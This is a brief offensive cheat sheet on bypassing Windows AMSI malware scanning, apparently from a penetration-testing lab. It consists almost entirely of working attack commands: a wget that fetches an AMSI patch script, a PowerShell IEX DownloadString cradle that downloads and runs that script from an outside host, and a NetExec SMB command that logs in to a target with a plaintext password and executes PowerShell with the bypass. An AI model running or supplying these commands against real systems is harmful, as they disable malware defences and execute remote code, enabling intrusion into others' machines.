# Cheat Cheets

## AMSI Bypass

### **Modified Amsi ScanBuffer Patch**

```
wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/shantanukhande-amsi.ps1 -q
```

```rust
 echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/shantanukhande-amsi.ps1');" > amsibypass.txt
```

```rust
 nxc smb 10.129.204.178 -u robert -p 'Inlanefreight01!' -X '$PSVersionTable' --amsi-bypass amsibypass.txt
```
